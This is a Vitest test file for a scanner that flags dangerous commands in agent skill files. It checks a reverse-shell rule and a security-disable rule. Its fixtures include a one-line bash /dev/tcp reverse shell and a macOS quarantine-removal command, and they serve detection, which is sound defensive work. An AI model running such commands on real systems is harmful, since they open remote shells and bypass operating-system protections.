import { describe, expect, it } from "vitest";
import { reverseShellRule, securityDisableRule } from "../../src/rules/execution.js";
import type { FileEntry } from "../../src/rules/types.js";

function entry(content: string): FileEntry {
  return { path: "SKILL.md", kind: "skill", content, lines: content.split("\n") };
}

describe("exec.reverse-shell", () => {
  it("flags a /dev/tcp reverse shell", () => {
    const findings = reverseShellRule.check(entry("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"));
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("critical");
  });

  it("ignores a plain netcat connectivity check", () => {
    expect(reverseShellRule.check(entry("nc -zv db.internal 5432"))).toHaveLength(0);
  });
});

describe("exec.security-disable", () => {
  it("flags macOS quarantine removal", () => {
    const findings = securityDisableRule.check(entry("xattr -d com.apple.quarantine ./tool"));
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("high");
  });

  it("ignores ordinary prose", () => {
    expect(securityDisableRule.check(entry("Disable the cache when testing."))).toHaveLength(0);
  });
});
